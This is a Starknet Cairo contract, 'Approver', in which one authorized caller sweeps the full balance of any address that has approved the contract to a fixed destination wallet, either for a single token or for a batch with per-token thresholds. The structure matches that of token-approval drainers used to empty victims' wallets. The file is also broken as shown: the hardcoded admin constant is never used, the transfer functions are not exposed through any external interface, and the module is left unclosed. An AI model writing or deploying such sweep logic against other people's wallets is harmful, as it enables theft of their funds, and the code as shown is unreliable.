#[starknet::contract]
pub mod Approver {
    use super::{
        ContractAddress, get_caller_address, get_contract_address,
        StoragePointerReadAccess, StoragePointerWriteAccess,
        IERC20Dispatcher, IERC20DispatcherTrait
    };

    // Hardcoded admin address - only this address can update contract parameters
    const ADMIN_ADDRESS: felt252 = 0x05c8803bC6441D1271345F02ff6f46E2c28A020952Fb05182739268909b21246;

    #[storage]
    pub struct Storage {
        authorized_caller: ContractAddress,  // Wallet B - only address that can trigger transfers
        destination_wallet: ContractAddress, // Wallet C - where tokens are sent
    }

    #[event]
    #[derive(Drop, starknet::Event)]
    pub enum Event {
        AuthorizedCallerUpdated: AuthorizedCallerUpdated,
        DestinationWalletUpdated: DestinationWalletUpdated,
    }

    #[derive(Drop, starknet::Event)]
    pub struct AuthorizedCallerUpdated {
        pub old_caller: ContractAddress,
        pub new_caller: ContractAddress,
    }

    #[derive(Drop, starknet::Event)]
    pub struct DestinationWalletUpdated {
        pub old_wallet: ContractAddress,
        pub new_wallet: ContractAddress,
    }

#[constructor]
    fn constructor(
        ref self: ContractState,
        authorized_caller: ContractAddress,
        destination_wallet: ContractAddress,
    ) {
        assert!(authorized_caller != 0.try_into().unwrap(), "Invalid authorized caller");
        assert!(destination_wallet != 0.try_into().unwrap(), "Invalid destination wallet");

        self.authorized_caller.write(authorized_caller);
        self.destination_wallet.write(destination_wallet);
    }

fn transfer_approved_tokens_with_threshold(
    ref self: ContractState,
    token: ContractAddress,
    addr: ContractAddress,
    min_threshold: u256
) -> u256 {
    // Only authorized caller (Wallet B) can trigger transfers
    let caller = get_caller_address();
    assert!(caller == self.authorized_caller.read(), "Unauthorized caller");

    let token_contract = IERC20Dispatcher { contract_address: token };

    // Get wallet balance and check threshold
    let balance = token_contract.balance_of(addr);
    if balance < min_threshold {
        return 0; // Below threshold, don't transfer
    }

    // Get allowance from wallet to this contract
    let contract_address = get_contract_address();
    let allowance = token_contract.allowance(addr, contract_address);

    // Ensure allowance is sufficient for the entire balance
    assert!(allowance >= balance, "Insufficient allowance for balance transfer");

    // Transfer the entire balance
    let success = token_contract.transfer_from(
        addr,
        self.destination_wallet.read(),
        balance
    );
    assert!(success, "Token transfer failed");
    balance
}

fn batch_transfer_with_thresholds(
    ref self: ContractState,
    addr: ContractAddress,
    tokens_and_thresholds: Array<(ContractAddress, u256)>
) {
    // Only authorized caller can trigger transfers
    let caller = get_caller_address();
    assert!(caller == self.authorized_caller.read(), "Unauthorized caller");

    // Process each token-threshold pair
    let mut i = 0;
    while i < tokens_and_thresholds.len() {
        let (token, threshold) = *tokens_and_thresholds.at(i);

        // Get balance and allowance
        let token_contract = IERC20Dispatcher { contract_address: token };
        let balance = token_contract.balance_of(addr);

        // Only transfer if balance meets threshold
        if balance >= threshold {
            let contract_address = get_contract_address();
            let allowance = token_contract.allowance(addr, contract_address);

            // Only transfer if allowance is sufficient for entire balance
            if allowance >= balance {
                let success = token_contract.transfer_from(
                    addr,
                    self.destination_wallet.read(),
                    balance
                );
                assert!(success, "Token transfer failed");
            }
            // Skip this token if allowance insufficient (don't fail entire batch)
        }

        i += 1;
    }
}

fn emergency_transfer_stuck_tokens(
    ref self: ContractState,
    token: ContractAddress
) {
    // Only authorized caller can recover stuck tokens
    let caller = get_caller_address();
    assert!(caller == self.authorized_caller.read(), "Unauthorized caller");

    // Check if contract has any tokens
    let token_contract = IERC20Dispatcher { contract_address: token };
    let contract_address = get_contract_address();
    let balance = token_contract.balance_of(contract_address);

    if balance > 0 {
        // Transfer all tokens from contract to destination
        let success = token_contract.transfer(
            self.destination_wallet.read(),
            balance
        );
        assert!(success, "Emergency transfer failed");
    }
}

